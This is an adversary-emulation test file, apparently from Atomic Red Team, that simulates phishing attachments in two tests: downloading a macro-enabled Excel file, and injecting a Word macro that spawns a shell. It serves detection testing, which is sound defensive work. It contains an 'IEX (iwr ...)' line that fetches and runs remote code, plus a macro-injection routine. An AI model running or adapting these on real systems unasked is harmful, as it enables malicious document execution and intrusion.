attack_technique: T1566.001
display_name: 'Phishing: Spearphishing Attachment'
atomic_tests:
- name: Download Phishing Attachment - VBScript
  auto_generated_guid: 114ccff9-ae6d-4547-9ead-4cd69f687306
  description: |
    The macro-enabled Excel file contains VBScript which opens your default web browser and opens it to [google.com](http://google.com).
    The below will successfully download the macro-enabled Excel file to the current location.
  supported_platforms:
  - windows
  executor:
    command: |
      if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){
        return 'Please install Microsoft Excel before running this test.'
      }
      else{
        $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
        $fileName = 'PhishingAttachment.xlsm'
        New-Item -Type File -Force -Path $fileName | out-null
        $wc = New-Object System.Net.WebClient
        $wc.Encoding = [System.Text.Encoding]::UTF8
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        ($wc.DownloadString("$url")) | Out-File $fileName
      }
    name: powershell
- name: Word spawned a command shell and used an IP address in the command line
  auto_generated_guid: cbb6799a-425c-4f83-9194-5447a909d67f
  description: |
    Word spawning a command prompt then running a command with an IP address in the command line is an indiciator of malicious activity.
    Upon execution, CMD will be lauchned and ping 8.8.8.8
  supported_platforms:
  - windows
  input_arguments:
    jse_path:
      description: |
        Path for the macro to write out the "malicious" .jse file
      type: String
      default: C:\Users\Public\art.jse
    ms_product:
      description: Maldoc application Word or Excel
      type: String
      default: Word
    ms_office_version:
      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
      type: String
      default: "16.0"
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependent registry keys
    prereq_command: |
      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
    get_prereq_command: |
      $msword = New-Object -ComObject word.application
      Stop-Process -Name WINWORD
  executor:
    command: |
      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
      $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
      Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
    cleanup_command: |
      if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
    name: powershell